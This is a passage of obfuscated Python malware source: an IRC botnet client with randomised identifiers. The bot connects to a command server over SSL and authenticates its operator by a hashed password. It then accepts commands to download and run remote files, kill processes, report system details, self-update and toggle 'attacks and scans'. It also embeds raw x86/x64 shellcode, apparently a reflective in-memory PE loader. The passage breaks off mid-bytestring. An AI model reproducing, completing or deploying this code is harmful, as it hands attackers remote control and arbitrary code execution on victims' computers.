            elif mTKSRDnijSo[3]==":" + self.cmdprefix + download:
                try:
                    urllib.urlretrieve(mTKSRDnijSo[4],mTKSRDnijSo[5])
                    self.commSock.send(PRIVMSG %s :Downloaded
 % (jQivgbKKoL))
                except:
                    self.commSock.send(PRIVMSG %s :Could not download!
 % (jQivgbKKoL))
            elif mTKSRDnijSo[3]==":" + self.cmdprefix + killknight:
                os.kill(os.getpid(),9)
            elif mTKSRDnijSo[3]==":" + self.cmdprefix + execute:
                try:
                    urllib.urlretrieve(mTKSRDnijSo[4],mTKSRDnijSo[5])
                    if not os.name == 'nt':
                        try:
                            os.chmod(mTKSRDnijSo[5], 777)
                        except:
                            pass
                    subprocess.Popen([("%s" % mTKSRDnijSo[5])])
                    self.commSock.send(PRIVMSG %s :Downloaded and executed
 % (jQivgbKKoL))
                except:
                    self.commSock.send(PRIVMSG %s :Could not download or execute!
 % (jQivgbKKoL))
            elif mTKSRDnijSo[3]==":" + self.cmdprefix + killbyname:
                if os.name == "nt":
                    os.popen(taskkill /f /im %s % mTKSRDnijSo[4])
                else:
                    os.popen(pkill -9 %s % mTKSRDnijSo[4])
                    os.popen(killall -9 %s % mTKSRDnijSo[4])
                self.commSock.send(PRIVMSG %s :Killed
 % (jQivgbKKoL))
            elif mTKSRDnijSo[3]==":" + self.cmdprefix + killbypid:
                os.kill(int(mTKSRDnijSo[4]),9)
                self.commSock.send(PRIVMSG %s :Killed
 % (jQivgbKKoL))
            elif mTKSRDnijSo[3]==":" + self.cmdprefix + disable:
                self.AELmEnMe=1
                self.commSock.send(PRIVMSG %s :Disabled attacks and scans!
 % (jQivgbKKoL))
            elif mTKSRDnijSo[3]==":" + self.cmdprefix + enable:
                self.AELmEnMe=0
                self.commSock.send(PRIVMSG %s :Re-enabled attacks and scans!
 % (jQivgbKKoL))
            elif mTKSRDnijSo[3]==":" + self.cmdprefix + getip:
                self.commSock.send(PRIVMSG %s :%s
 % (jQivgbKKoL,self.qWMQJquJ()))
            elif mTKSRDnijSo[3]==":" + self.cmdprefix + "ram":
                iawVoSfihdXM = 0
                if os.name == "nt":
                    iawVoSfihdXM = psutil.virtual_memory().total / 1024
                else:
                    dpBOTIFMo = dict((i.split()[0].rstrip(':'),int(i.split()[1])) for i in open(/proc/meminfo).readlines())
                    iawVoSfihdXM = dpBOTIFMo[MemTotal]
                self.commSock.send(PRIVMSG %s :%s MB RAM total
 % (jQivgbKKoL, iawVoSfihdXM/1024))
            elif mTKSRDnijSo[3]==":" + self.cmdprefix + update:
                try:
                    if mTKSRDnijSo[5]:
                        threading.Thread(target=self.HXRAPMoEI, args=(mTKSRDnijSo[4], int(mTKSRDnijSo[5]),)).start()
                        self.commSock.send(PRIVMSG %s :Updating
 % (jQivgbKKoL))
                        time.sleep(10)
                        os.kill(os.getpid(),9)
                except:
                    self.commSock.send(PRIVMSG %s :Failed to start thread
 % (jQivgbKKoL))
                    pass
            elif mTKSRDnijSo[3]==":" + self.cmdprefix + visit:
                if os.name == "nt":
                    webbrowser.open(mTKSRDnijSo[4])
                    self.commSock.send(PRIVMSG %s :Visited!
 % (jQivgbKKoL))
            elif mTKSRDnijSo[3]==":" + self.cmdprefix + dlexe:
                if os.name == "nt":
                    try:
                        threading.Thread(target=self.pogaiwWIid, args=(mTKSRDnijSo[4], os.getenv(TEMP) + "\\" + mTKSRDnijSo[5],)).start()
                        self.commSock.send(PRIVMSG %s :Download and execute task started!
 % (jQivgbKKoL))
                    except:
                        pass
            elif mTKSRDnijSo[3]==":" + self.cmdprefix + info:
                omaOAnbbu=""
                omaOAnbbu+=Architecture:  + platform.architecture()[0]
                omaOAnbbu+= Machine:  + platform.machine()
                omaOAnbbu+= Node:  + platform.node()
                omaOAnbbu+= System:  + platform.system()
                try:
                    if os.name == "nt":
                        dist = platform.platform()
                    else:
                        dist = platform.dist()
                        dist = " ".join(x for x in dist)
                        omaOAnbbu+= Distribution:  + dist
                except:
                    pass
                omaOAnbbu+= processors: 
                if os.name == "nt":
                    omaOAnbbu+="0-" + str(multiprocessing.cpu_count()) + " "
                    omaOAnbbu+=platform.processor()
                else:
                    with open(/proc/cpuinfo, "r")  as f:
                        info = f.readlines()
                    jeYEOwodO = [x.strip().split(":")[1] for x in info if model name  in x]
                    ixchCchiciOz=[]
                    last = len(jeYEOwodO)
                    for ALcXJgphJyEg, item in enumerate(jeYEOwodO):
                        if item not in ixchCchiciOz:
                            ixchCchiciOz.append(item)
                            omaOAnbbu+=str(ALcXJgphJyEg) + "-" + str(last) +  item
                        last-=1
                self.commSock.send(PRIVMSG %s :%s
 % (jQivgbKKoL, omaOAnbbu))
            elif mTKSRDnijSo[3]==":" + self.cmdprefix + repack:
                if EFCTiLDlTRA.endswith(".py"):
                    try:
                        self.ZdqTeSvuK()
                        self.commSock.send(PRIVMSG %s :Repacked code!
 % (jQivgbKKoL))
                    except:
                        self.commSock.send(PRIVMSG %s :Failed to repack
 % (jQivgbKKoL))
                else:
                    self.commSock.send(PRIVMSG %s :Running as binary, not repacking
 % (jQivgbKKoL))
        except:
            pass
    def qgoSdaBM(self):
        global aglKdYah
        i=0
        while i<=0x1E:
            try:
                self.commSock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.commSock.settimeout(10)
                self.commSock.connect((WMiBcGbzLiZ, 6697))
                self.commSock=ssl.wrap_socket(self.commSock)  
                self.commSock.send(NICK %s
 % self.hLqhZnCt)
                self.commSock.send(USER %s * localhost :%s
 % (self.aRHRPteL, self.pBYbuWVq))
                BmFFwhhNF=""
                jdICiGazZJ=0
                aglKdYah=-1
                while 1:
                    try:
                        BmFFwhhNF=BmFFwhhNF+self.commSock.recv(2048)
                        if BmFFwhhNF == "":
                            break
                        TsCiGucDD=BmFFwhhNF.split("\n")
                        BmFFwhhNF=TsCiGucDD.pop( )
                        for mTKSRDnijSo in TsCiGucDD:
                            miwNJnEaahK=mTKSRDnijSo
                            mTKSRDnijSo=mTKSRDnijSo.rstrip()
                            mTKSRDnijSo=mTKSRDnijSo.split()
                            if mTKSRDnijSo[0]==PING:
                                self.commSock.send(PONG %s
 % mTKSRDnijSo[1])
                            elif mTKSRDnijSo[1]=="376" or mTKSRDnijSo[1]=="422" or mTKSRDnijSo[1]=="352":
                                if jdICiGazZJ == 0:
                                    self.commSock.send(JOIN %s %s
 % (self.AviaeEPO,self.ADjeklE))
                                    jdICiGazZJ = 1
                            elif mTKSRDnijSo[1]=="433":
                                self.VwkBkdwM=enYhURMomcJY(random.randrange(8,12))
                                self.hLqhZnCt=[HAX|+platform.system()+"|"+platform.machine()+"|"+str(multiprocessing.cpu_count())+"]"+str(self.VwkBkdwM)
                                self.commSock.send(NICK %s
 % self.hLqhZnCt)
                            try:
                                jQivgbKKoL=miwNJnEaahK[1:miwNJnEaahK.find('!')]
                                if self.AviaeEPO + " :" in miwNJnEaahK:
                                    jQivgbKKoL=self.AviaeEPO                            
                            except:
                                pass
                            if aglKdYah==-1:
                                try:
                                    if mTKSRDnijSo[3]==":" + self.cmdprefix + login:
                                        if sha512(mTKSRDnijSo[4]).hexdigest()==self.botinEYahePcCAg:
                                            aglKdYah=1024
                                            self.commSock.send(PRIVMSG %s :Authorization successful
 % (jQivgbKKoL))
                                        else:
                                            self.commSock.send(PRIVMSG %s :Authorization failed
 % (jQivgbKKoL))
                                        continue
                                except:
                                    pass
                            if aglKdYah > 0:
                                try:
                                    self.XKWQqQizgo(mTKSRDnijSo, jQivgbKKoL)
                                except:
                                    pass
                    except:
                        try:
                            self.commSock.send(NOTICE  + self.hLqhZnCt +  :PING
)
                            continue
                        except:
                            break
            except Exception as e:
                print str(e)
                i+=1
                continue
idKppGEZE=512
IVhTjdpWNn=34404
def TdxIaFdWYl(IoAwsaDPj):
    iLccNosgqXZE = struct.unpack("<L", IoAwsaDPj[60:64])[0]
    amkGbhczOSo = struct.unpack("<H", IoAwsaDPj[iLccNosgqXZE+4:iLccNosgqXZE+4+2])[0]
    if amkGbhczOSo == idKppGEZE or amkGbhczOSo == IVhTjdpWNn:
        return True   
    return False
def aVxhKsCWoVo(YqNWYajlacjd, qeDoPJWPsaE=0x10, BEbBsaQKzvpo=b'None', ddNSEmQRaa=0):
    fafMcCKpZ = b'\x81\xEC\x14\x01\x00\x00\x53\x55\x56\x57\x6A\x6B\x58\x6A\x65\x66\x89\x84\x24\xCC\x00\x00\x00\x33\xED\x58\x6A\x72\x59\x6A\x6E\x5B\x6A\x6C\x5A\x6A\x33\x66\x89\x84\x24\xCE\x00\x00\x00\x66\x89\x84\x24\xD4\x00\x00\x00\x58\x6A\x32\x66\x89\x84\x24\xD8\x00\x00\x00\x58\x6A\x2E\x66\x89\x84\x24\xDA\x00\x00\x00\x58\x6A\x64\x66\x89\x84\x24\xDC\x00\x00\x00\x58\x89\xAC\x24\xB0\x00\x00\x00\x89\x6C\x24\x34\x89\xAC\x24\xB8\x00\x00\x00\x89\xAC\x24\xC4\x00\x00\x00\x89\xAC\x24\xB4\x00\x00\x00\x89\xAC\x24\xAC\x00\x00\x00\x89\xAC\x24\xE0\x00\x00\x00\x66\x89\x8C\x24\xCC\x00\x00\x00\x66\x89\x9C\x24\xCE\x00\x00\x00\x66\x89\x94\x24\xD2\x00\x00\x00\x66\x89\x84\x24\xDA\x00\x00\x00\x66\x89\x94\x24\xDC\x00\x00\x00\x66\x89\x94\x24\xDE\x00\x00\x00\xC6\x44\x24\x3C\x53\x88\x54\x24\x3D\x66\xC7\x44\x24\x3E\x65\x65\xC6\x44\x24\x40\x70\x66\xC7\x44\x24\x50\x4C\x6F\xC6\x44\x24\x52\x61\x88\x44\x24\x53\x66\xC7\x44\x24\x54\x4C\x69\xC6\x44\x24\x56\x62\x88\x4C\x24\x57\xC6\x44\x24\x58\x61\x88\x4C\x24\x59\x66\xC7\x44\x24\x5A\x79\x41\x66\xC7\x44\x24\x44\x56\x69\x88\x4C\x24\x46\x66\xC7\x44\x24\x47\x74\x75\xC6\x44\x24\x49\x61\x88\x54\x24\x4A\xC6\x44\x24\x4B\x41\x88\x54\x24\x4C\x88\x54\x24\x4D\x66\xC7\x44\x24\x4E\x6F\x63\x66\xC7\x44\x24\x5C\x56\x69\x88\x4C\x24\x5E\x66\xC7\x44\x24\x5F\x74\x75\xC6\x44\x24\x61\x61\x88\x54\x24\x62\xC6\x44\x24\x63\x50\x88\x4C\x24\x64\xC7\x44\x24\x65\x6F\x74\x65\x63\xC6\x44\x24\x69\x74\xC6\x84\x24\x94\x00\x00\x00\x46\x88\x94\x24\x95\x00\x00\x00\xC7\x84\x24\x96\x00\x00\x00\x75\x73\x68\x49\x88\x9C\x24\x9A\x00\x00\x00\x66\xC7\x84\x24\x9B\x00\x00\x00\x73\x74\x88\x8C\x24\x9D\x00\x00\x00\xC7\x84\x24\x9E\x00\x00\x00\x75\x63\x74\x69\xC6\x84\x24\xA2\x00\x00\x00\x6F\x6A\x65\x59\x88\x8C\x24\xA8\x00\x00\x00\x88\x4C\x24\x6D\x88\x4C\x24\x74\x88\x4C\x24\x79\x88\x8C\x24\x92\x00\x00\x00\xB9\x13\x9C\xBF\xBD\x88\x9C\x24\xA3\x00\x00\x00\xC7\x84\x24\xA4\x00\x00\x00\x43\x61\x63\x68\xC6\x44\x24\x6C\x47\xC7\x44\x24\x6E\x74\x4E\x61\x74\x66\xC7\x44\x24\x72\x69\x76\xC7\x44\x24\x75\x53\x79\x73\x74\x66\xC7\x44\x24\x7A\x6D\x49\x88\x5C\x24\x7C\x66\xC7\x44\x24\x7D\x66\x6F\x66\xC7\x84\x24\x80\x00\x00\x00\x52\x74\x88\x94\x24\x82\x00\x00\x00\xC6\x84\x24\x83\x00\x00\x00\x41\x88\x84\x24\x84\x00\x00\x00\x88\x84\x24\x85\x00\x00\x00\x66\xC7\x84\x24\x86\x00\x00\x00\x46\x75\x88\x9C\x24\x88\x00\x00\x00\xC7\x84\x24\x89\x00\x00\x00\x63\x74\x69\x6F\x88\x9C\x24\x8D\x00\x00\x00\x66\xC7\x84\x24\x8E\x00\x00\x00\x54\x61\xC6\x84\x24\x90\x00\x00\x00\x62\x88\x94\x24\x91\x00\x00\x00\xE8\x77\x08\x00\x00\xB9\xB5\x41\xD9\x5E\x8B\xF0\xE8\x6B\x08\x00\x00\x8B\xD8\x8D\x84\x24\xC8\x00\x00\x00\x6A\x18\x89\x84\x24\xEC\x00\x00\x00\x58\x66\x89\x84\x24\xE6\x00\x00\x00\x66\x89\x84\x24\xE4\x00\x00\x00\x8D\x44\x24\x1C\x50\x8D\x84\x24\xE8\x00\x00\x00\x89\x5C\x24\x34\x50\x55\x55\xFF\xD6\x6A\x0C\x5F\x8D\x44\x24\x44\x66\x89\x7C\x24\x14\x89\x44\x24\x18\x8D\x44\x24\x34\x50\x55\x8D\x44\x24\x1C\x66\x89\x7C\x24\x1E\x50\xFF\x74\x24\x28\xFF\xD3\x6A\x0E\x58\x66\x89\x44\x24\x14\x66\x89\x44\x24\x16\x8D\x44\x24\x5C\x89\x44\x24\x18\x8D\x84\x24\xB4\x00\x00\x00\x50\x55\x8D\x44\x24\x1C\x50\xFF\x74\x24\x28\xFF\xD3\x6A\x15\x58\x66\x89\x44\x24\x14\x66\x89\x44\x24\x16\x8D\x84\x24\x94\x00\x00\x00\x89\x44\x24\x18\x8D\x84\x24\xB8\x00\x00\x00\x50\x55\x8D\x44\x24\x1C\x50\xFF\x74\x24\x28\xFF\xD3\x6A\x13\x5E\x8D\x44\x24\x6C\x66\x89\x74\x24\x14\x89\x44\x24\x18\x8D\x84\x24\xC4\x00\x00\x00\x50\x55\x8D\x44\x24\x1C\x66\x89\x74\x24\x1E\x50\xFF\x74\x24\x28\xFF\xD3\x6A\x05\x58\x66\x89\x44\x24\x14\x66\x89\x44\x24\x16\x8D\x44\x24\x3C\x89\x44\x24\x18\x8D\x84\x24\xAC\x00\x00\x00\x50\x55\x8D\x44\x24\x1C\x50\xFF\x74\x24\x28\xFF\xD3\x8D\x84\x24\x80\x00\x00\x00\x66\x89\x74\x24\x14\x89\x44\x24\x18\x8D\x84\x24\xE0\x00\x00\x00\x50\x55\x8D\x44\x24\x1C\x66\x89\x74\x24\x1E\x50\xFF\x74\x24\x28\xFF\xD3\x8D\x44\x24\x50\x66\x89\x7C\x24\x14\x89\x44\x24\x18\x8D\x84\x24\xB0\x00\x00\x00\x50\x55\x8D\x44\x24\x1C\x66\x89\x7C\x24\x1E\x50\xFF\x74\x24\x28\xFF\xD3\x39\x6C\x24\x34\x0F\x84\x00\x07\x00\x00\x39\xAC\x24\xB4\x00\x00\x00\x0F\x84\xF3\x06\x00\x00\x39\xAC\x24\xAC\x00\x00\x00\x0F\x84\xE6\x06\x00\x00\x39\xAC\x24\xB8\x00\x00\x00\x0F\x84\xD9\x06\x00\x00\x8B\xAC\x24\xC4\x00\x00\x00\x85\xED\x0F\x84\xCA\x06\x00\x00\x8B\xBC\x24\x28\x01\x00\x00\x8B\x77\x3C\x03\xF7\x81\x3E\x50\x45\x00\x00\x0F\x85\xB2\x06\x00\x00\xB8\x4C\x01\x00\x00\x66\x39\x46\x04\x0F\x85\xA3\x06\x00\x00\xF6\x46\x38\x01\x0F\x85\x99\x06\x00\x00\x0F\xB7\x4E\x14\x33\xDB\x0F\xB7\x56\x06\x83\xC1\x24\x85\xD2\x74\x1E\x03\xCE\x83\x79\x04\x00\x8B\x46\x38\x0F\x45\x41\x04\x03\x01\x8D\x49\x28\x3B\xC3\x0F\x46\xC3\x8B\xD8\x83\xEA\x01\x75\xE4\x8D\x84\x24\x00\x01\x00\x00\x50\xFF\xD5\x8B\x8C\x24\x04\x01\x00\x00\x8D\x51\xFF\x8D\x69\xFF\xF7\xD2\x03\x6E\x50\x8D\x41\xFF\x03\xC3\x23\xEA\x23\xC2\x3B\xE8\x0F\x85\x3D\x06\x00\x00\x6A\x04\x68\x00\x30\x00\x00\x55\xFF\x76\x34\xFF\x54\x24\x44\x8B\xD8\x89\x5C\x24\x2C\x85\xDB\x75\x13\x6A\x04\x68\x00\x30\x00\x00\x55\x50\xFF\x54\x24\x44\x8B\xD8\x89\x44\x24\x2C\xF6\x84\x24\x38\x01\x00\x00\x01\x74\x23\x8B\x47\x3C\x89\x43\x3C\x8B\x4F\x3C\x3B\x4E\x54\x73\x2E\x8B\xEF\x8D\x14\x0B\x2B\xEB\x8A\x04\x2A\x41\x88\x02\x42\x3B\x4E\x54\x72\xF4\xEB\x19\x33\xED\x39\x6E\x54\x76\x12\x8B\xD7\x8B\xCB\x2B\xD3\x8A\x04\x11\x45\x88\x01\x41\x3B\x6E\x54\x72\xF4\x8B\x6B\x3C\x33\xC9\x03\xEB\x89\x4C\x24\x10\x33\xC0\x89\x6C\x24\x28\x0F\xB7\x55\x14\x83\xC2\x28\x66\x3B\x45\x06\x73\x31\x03\xD5\x33\xF6\x39\x32\x76\x19\x8B\x42\x04\x8B\x4A\xFC\x03\xC6\x03\xCB\x8A\x04\x38\x88\x04\x31\x46\x3B\x32\x72\xEB\x8B\x4C\x24\x10\x0F\xB7\x45\x06\x41\x83\xC2\x28\x89\x4C\x24\x10\x3B\xC8\x72\xD1\x8B\xC3\xC7\x84\x24\xBC\x00\x00\x00\x01\x00\x00\x00\x2B\x45\x34\x89\x44\x24\x24\x0F\x84\xC4\x00\x00\x00\x83\xBD\xA4\x00\x00\x00\x00\x0F\x84\xB7\x00\x00\x00\x8B\xB5\xA0\x00\x00\x00\x03\xF3\x83\x3E\x00\x0F\x84\xA6\x00\x00\x00\x6A\x02\x8B\xF8\x5D\x8D\x56\x08\xEB\x75\x0F\xB7\x02\x89\x44\x24\x10\x0F\xB7\xC8\x66\xC1\xE8\x0C\x66\x83\xF8\x0A\x75\x28\x8B\x16\x8B\x4C\x24\x10\x81\xE1\xFF\x0F\x00\x00\x89\x4C\x24\x10\x8D\x04\x1A\x8B\x0C\x08\x8D\x04\x1A\x8B\x54\x24\x10\x03\xCF\x89\x0C\x10\x8B\x54\x24\x24\xEB\x37\x66\x83\xF8\x03\x75\x0D\x81\xE1\xFF\x0F\x00\x00\x03\x0E\x01\x3C\x19\xEB\x24\x66\x3B\x84\x24\xBC\x00\x00\x00\x75\x07\x8B\xC7\xC1\xE8\x10\xEB\x08\x66\x3B\xC5\x75\x0E\x0F\xB7\xC7\x81\xE1\xFF\x0F\x00\x00\x03\x0E\x01\x04\x19\x03\xD5\x8B\x46\x04\x03\xC6\x89\x54\x24\x24\x3B\xD0\x0F\x85\x7A\xFF\xFF\xFF\x83\x3A\x00\x8B\xF2\x0F\x85\x6A\xFF\xFF\xFF\x8B\x6C\x24\x28\x8B\xBC\x24\x28\x01\x00\x00\x83\xBD\x84\x00\x00\x00\x00\x0F\x84\xD7\x01\x00\x00\x8B\xB5\x80\x00\x00\x00\x33\xC0\x89\x44\x24\x10\x8D\x0C\x1E\x89\x4C\x24\x24\x83\xC1\x0C\x39\x01\x74\x0D\x8D\x49\x14\x40\x83\x39\x00\x75\xF7\x89\x44\x24\x10\x8B\x8C\x24\x38\x01\x00\x00\x8B\xD1\x83\xE2\x04\x89\x54\x24\x38\x8B\xD6\x0F\x84\xC3\x00\x00\x00\x83\xF8\x01\x0F\x86\xBA\x00\x00\x00\x83\xA4\x24\xBC\x00\x00\x00\x00\xC1\xE9\x10\x89\x8C\x24\x38\x01\x00\x00\x8D\x48\xFF\x89\x8C\x24\xC0\x00\x00\x00\x85\xC9\x0F\x84\xA1\x00\x00\x00\x8B\x74\x24\x24\x8B\xDE\x8B\xAC\x24\xBC\x00\x00\x00\x8B\xC8\x69\xFF\xFD\x43\x03\x00\x2B\xCD\x33\xD2\xB8\xFF\x7F\x00\x00\xF7\xF1\x81\xC7\xC3\x9E\x26\x00\x33\xD2\x89\xBC\x24\x28\x01\x00\x00\x6A\x05\x8D\x48\x01\x8B\xC7\xC1\xE8\x10\x8D\xBC\x24\xF0\x00\x00\x00\x25\xFF\x7F\x00\x00\xF7\xF1\x59\x03\xC5\x6B\xC0\x14\x6A\x05\x03\xC6\x45\x8B\xF0\xF3\xA5\x59\x8B\xF3\x8B\xF8\x8B\x44\x24\x10\xF3\xA5\x6A\x05\x8B\xFB\x8D\xB4\x24\xF0\x00\x00\x00\x59\xF3\xA5\x8B\xBC\x24\x28\x01\x00\x00\x83\xC3\x14\x8B\x74\x24\x24\x3B\xAC\x24\xC0\x00\x00\x00\x72\x87\x8B\x6C\x24\x28\x8B\x5C\x24\x2C\x8B\x95\x80\x00\x00\x00\xEB\x0B\x8B\x44\x24\x38\x89\x84\x24\x38\x01\x00\x00\x8D\x3C\x1A\x8B\x47\x0C\x89\x7C\x24\x2C\x85\xC0\x0F\x84\xB8\x00\x00\x00\x03\xC3\x50\xFF\x94\x24\xB4\x00\x00\x00\x8B\xD0\x89\x54\x24\x1C\x8B\x37\x8B\x6F\x10\x03\xF3\x03\xEB\x8B\x0E\x85\xC9\x74\x60\x8B\x7C\x24\x30\x85\xC9\x79\x09\x0F\xB7\x06\x55\x50\x6A\x00\xEB\x36\x83\xC1\x02\x33\xC0\x03\xCB\x89\x8C\x24\xC0\x00\x00\x00\x38\x01\x74\x0E\x40\x41\x80\x39\x00\x75\xF9\x8B\x8C\x24\xC0\x00\x00\x00\x55\x66\x89\x44\x24\x18\x66\x89\x44\x24\x1A\x8D\x44\x24\x18\x6A\x00\x89\x4C\x24\x20\x50\x52\xFF\xD7\x83\xC6\x04\x83\xC5\x04\x8B\x0E\x85\xC9\x74\x06\x8B\x54\x24\x1C\xEB\xA8\x8B\x7C\x24\x2C\x83\x7C\x24\x38\x00\x74\x1C\x33\xC0\x40\x39\x44\x24\x10\x76\x13\x69\x84\x24\x38\x01\x00\x00\xE8\x03\x00\x00\x50\xFF\x94\x24\xB0\x00\x00\x00\x8B\x47\x20\x83\xC7\x14\x89\x7C\x24\x2C\x85\xC0\x0F\x85\x4C\xFF\xFF\xFF\x8B\x6C\x24\x28\x83\xBD\xE4\x00\x00\x00\x00\x0F\x84\xAD\x00\x00\x00\x8B\x85\xE0\x00\x00\x00\x83\xC0\x04\x03\xC3\x89\x44\x24\x10\x8B\x00\x85\xC0\x0F\x84\x94\x00\x00\x00\x8B\x6C\x24\x10\x03\xC3\x50\xFF\x94\x24\xB4\x00\x00\x00\x8B\xC8\x89\x4C\x24\x1C\x8B\x75\x08\x8B\x7D\x0C\x03\xF3\x03\xFB\x83\x3E\x00\x74\x5B\x8B\x6C\x24\x30\x8B\x17\x85\xD2\x79\x09\x56\x0F\xB7\xC2\x50\x6A\x00\xEB\x30\x83\xC2\x02\x33\xC0\x03\xD3\x89\x54\x24\x38\x38\x02\x74\x0B\x40\x42\x80\x3A\x00\x75\xF9\x8B\x54\x24\x38\x56\x66\x89\x44\x24\x18\x66\x89\x44\x24\x1A\x8D\x44\x24\x18\x6A\x00\x89\x54\x24\x20\x50\x51\xFF\xD5\x83\xC6\x04\x83\xC7\x04\x83\x3E\x00\x74\x06\x8B\x4C\x24\x1C\xEB\xAD\x8B\x6C\x24\x10\x83\xC5\x20\x89\x6C\x24\x10\x8B\x45\x00\x85\xC0\x0F\x85\x74\xFF\xFF\xFF\x8B\x6C\x24\x28\x0F\xB7\x75\x14\x33\xC0\x83\xC6\x28\x33\xFF\x66\x3B\x45\x06\x0F\x83\xE5\x00\x00\x00\x03\xF5\xBA\x00\x00\x00\x40\x83\x3E\x00\x0F\x84\xC5\x00\x00\x00\x8B\x4E\x14\x8B\xC1\x25\x00\x00\x00\x20\x75\x0B\x85\xCA\x75\x07\x85\xC9\x78\x03\x40\xEB\x62\x85\xC0\x75\x30\x85\xCA\x75\x08\x85\xC9\x79\x04\x6A\x08\xEB\x51\x85\xC0\x75\x20\x85\xCA\x74\x08\x85\xC9\x78\x04\x6A\x02\xEB\x41\x85\xC0\x75\x10\x85\xCA\x74\x08\x85\xC9\x79\x04\x6A\x04\xEB\x31\x85\xC0\x74\x4A\x85\xCA\x75\x08\x85\xC9\x78\x04\x6A\x10\xEB\x21\x85\xC0\x74\x3A\x85\xCA\x75\x0B\x85\xC9\x79\x07\xB8\x80\x00\x00\x00\xEB\x0F\x85\xC0\x74\x27\x85\xCA\x74\x0D\x85\xC9\x78\x09\x6A\x20\x58\x89\x44\x24\x20\xEB\x1A\x85\xC0\x74\x12\x85\xCA\x74\x0E\x8B\x44\x24\x20\x85\xC9\x6A\x40\x5A\x0F\x48\xC2\xEB\xE4\x8B\x44\x24\x20\xF7\x46\x14\x00\x00\x00\x04\x74\x09\x0D\x00\x02\x00\x00\x89\x44\x24\x20\x8D\x4C\x24\x20\x51\x50\x8B\x46\xFC\xFF\x36\x03\xC3\x50\xFF\x94\x24\xC4\x00\x00\x00\xBA\x00\x00\x00\x40\x0F\xB7\x45\x06\x47\x83\xC6\x28\x3B\xF8\x0F\x82\x22\xFF\xFF\xFF\x6A\x00\x6A\x00\x6A\xFF\xFF\x94\x24\xC4\x00\x00\x00\x83\xBD\xC4\x00\x00\x00\x00\x74\x26\x8B\x85\xC0\x00\x00\x00\x8B\x74\x18\x0C\x8B\x06\x85\xC0\x74\x16\x33\xED\x45\x6A\x00\x55\x53\xFF\xD0\x8D\x76\x04\x8B\x06\x85\xC0\x75\xF1\x8B\x6C\x24\x28\x33\xC0\x40\x50\x50\x8B\x45\x28\x53\x03\xC3\xFF\xD0\x83\xBC\x24\x2C\x01\x00\x00\x00\x0F\x84\xAB\x00\x00\x00\x83\x7D\x7C\x00\x0F\x84\xA1\x00\x00\x00\x8B\x55\x78\x03\xD3\x8B\x6A\x18\x85\xED\x0F\x84\x91\x00\x00\x00\x83\x7A\x14\x00\x0F\x84\x87\x00\x00\x00\x8B\x7A\x20\x8B\x4A\x24\x03\xFB\x83\x64\x24\x30\x00\x03\xCB\x85\xED\x74\x74\x8B\x37\xC7\x44\x24\x10\x00\x00\x00\x00\x03\xF3\x74\x66\x8A\x06\x84\xC0\x74\x1A\x8B\x6C\x24\x10\x0F\xBE\xC0\x03\xE8\xC1\xCD\x0D\x46\x8A\x06\x84\xC0\x75\xF1\x89\x6C\x24\x10\x8B\x6A\x18\x8B\x84\x24\x2C\x01\x00\x00\x3B\x44\x24\x10\x75\x04\x85\xC9\x75\x15\x8B\x44\x24\x30\x83\xC7\x04\x40\x83\xC1\x02\x89\x44\x24\x30\x3B\xC5\x72\xAE\xEB\x20\x0F\xB7\x09\x8B\x42\x1C\xFF\xB4\x24\x34\x01\x00\x00\xFF\xB4\x24\x34\x01\x00\x00\x8D\x04\x88\x8B\x04\x18\x03\xC3\xFF\xD0\x59\x59\x8B\xC3\xEB\x02\x33\xC0\x5F\x5E\x5D\x5B\x81\xC4\x14\x01\x00\x00\xC3\x83\xEC\x14\x64\xA1\x30\x00\x00\x00\x53\x55\x56\x8B\x40\x0C\x57\x89\x4C\x24\x1C\x8B\x78\x0C\xE9\xA5\x00\x00\x00\x8B\x47\x30\x33\xF6\x8B\x5F\x2C\x8B\x3F\x89\x44\x24\x10\x8B\x42\x3C\x89\x7C\x24\x14\x8B\x6C\x10\x78\x89\x6C\x24\x18\x85\xED\x0F\x84\x80\x00\x00\x00\xC1\xEB\x10\x33\xC9\x85\xDB\x74\x2F\x8B\x7C\x24\x10\x0F\xBE\x2C\x0F\xC1\xCE\x0D\x80\x3C\x0F\x61\x89\x6C\x24\x10\x7C\x09\x8B\xC5\x83\xC0\xE0\x03\xF0\xEB\x04\x03\x74\x24\x10\x41\x3B\xCB\x72\xDD\x8B\x7C\x24\x14\x8B\x6C\x24\x18\x8B\x44\x2A\x20\x33\xDB\x8B\x4C\x2A\x18\x03\xC2\x89\x4C\x24\x10\x85\xC9\x74\x34\x8B\x38\x33\xED\x03\xFA\x83\xC0\x04\x89\x44\x24\x20\x8A\x0F\xC1\xCD\x0D\x0F\xBE\xC1\x03\xE8\x47\x84\xC9\x75\xF1\x8B\x7C\x24\x14\x8D\x04\x2E\x3B\x44\x24\x1C\x74\x20\x8B\x44\x24\x20\x43\x3B\x5C\x24\x10\x72\xCC\x8B\x57\x18\x85\xD2\x0F\x85\x50\xFF\xFF\xFF\x33\xC0\x5F\x5E\x5D\x5B\x83\xC4\x14\xC3\x8B\x74\x24\x18\x8B\x44\x16\x24\x8D\x04\x58\x0F\xB7\x0C\x10\x8B\x44\x16\x1C\x8D\x04\x88\x8B\x04\x10\x03\xC2\xEB\xDB'
    PWYIbcNFR = b'\x48\x8B\xC4\x48\x89\x58\x08\x44\x89\x48\x20\x4C\x89\x40\x18\x89\x50\x10\x55\x56\x57\x41\x54\x41\x55\x41\x56\x41\x57\x48\x8D\x6C\x24\x90\x48\x81\xEC\x70\x01\x00\x00\x45\x33\xFF\xC7\x45\xD8\x6B\x00\x65\x00\x48\x8B\xF1\x4C\x89\x7D\xF8\xB9\x13\x9C\xBF\xBD\x4C\x89\x7D\xC8\x4C\x89\x7D\x08\x45\x8D\x4F\x65\x4C\x89\x7D\x10\x44\x88\x4D\xBC\x44\x88\x4D\xA2\x4C\x89\x7D\x00\x4C\x89\x7D\xF0\x4C\x89\x7D\x18\x44\x89\x7D\x24\x44\x89\x7C\x24\x2C\xC7\x45\xDC\x72\x00\x6E\x00\xC7\x45\xE0\x65\x00\x6C\x00\xC7\x45\xE4\x33\x00\x32\x00\xC7\x45\xE8\x2E\x00\x64\x00\xC7\x45\xEC\x6C\x00\x6C\x00\xC7\x44\x24\x40\x53\x6C\x65\x65\xC6\x44\x24\x44\x70\xC7\x44\x24\x58\x4C\x6F\x61\x64\xC7\x44\x24\x5C\x4C\x69\x62\x72\xC7\x44\x24\x60\x61\x72\x79\x41\xC7\x44\x24\x48\x56\x69\x72\x74\xC7\x44\x24\x4C\x75\x61\x6C\x41\xC7\x44\x24\x50\x6C\x6C\x6F\x63\xC7\x44\x24\x